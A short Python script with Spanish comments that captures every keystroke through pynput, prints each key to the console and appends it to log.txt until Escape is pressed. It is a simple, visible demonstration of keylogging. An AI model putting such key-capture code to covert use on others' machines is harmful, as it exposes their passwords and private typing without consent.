from pynput import keyboard
import os

# Función que se ejecuta cada vez que se presiona una tecla
def on_press(key):
    try:
        # Imprime la tecla presionada en la consola
        print(f'Tecla presionada: {key}')
        
        # Guarda la tecla presionada en un archivo de texto
        with open('log.txt', 'a') as file:
            file.write(str(key) + '\n')
    except Exception as e:
        print(f'Error al capturar la tecla: {e}')

# Función que se ejecuta cada vez que se suelta una tecla
def on_release(key):
    if key == keyboard.Key.esc:
        # Sale del bucle si se presiona la tecla Escape
        return False

# Configura los listeners para capturar las teclas
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    